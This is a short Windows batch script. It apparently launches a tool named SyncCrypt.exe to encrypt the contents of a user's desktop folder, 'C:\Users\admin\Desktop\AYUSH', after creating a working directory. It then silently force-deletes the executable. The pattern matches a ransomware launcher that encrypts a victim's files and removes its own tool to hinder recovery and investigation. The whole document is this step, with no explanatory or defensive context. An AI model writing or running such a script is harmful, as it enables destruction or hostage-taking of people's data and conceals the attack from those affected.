@echo off
CD /d "%~dp0"
mkdir c:\BgInfo\Encrr
SyncCrypt.exe encrypt "C:\Users\admin\Desktop\AYUSH"
del SyncCrypt.exe /q /f
@echo on